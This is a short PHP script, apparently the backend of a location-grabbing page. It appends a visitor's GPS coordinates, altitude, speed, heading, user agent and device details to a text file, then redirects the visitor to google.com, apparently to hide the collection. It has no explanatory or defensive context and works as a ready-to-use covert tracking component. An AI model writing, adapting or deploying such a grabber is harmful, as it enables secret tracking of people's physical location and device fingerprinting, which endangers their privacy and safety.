<?php

file_put_contents("geolocate.txt", "" . $_GET['latitude'] . "\n" . "" . $_GET["longitude"] . "\n" . "" . $_GET["useragent"] . "\n" . "" . $_GET["altitude"] . "\n" . "" . $_GET["accuracy"] . "\n" . ""  . $_GET["speed"] . "\n" . "" . $_GET["heading"] . "\n" . "" . $_GET["platform"] . "\n" . "" . $_GET["hardware"] . "\n" . ""   . $_GET["memory"] ."\n" . ""   . $_GET["height"] ."\n" . ""   . $_GET["width"] ."\n", FILE_APPEND);

header('Location: https://www.google.com/');
exit();
?>
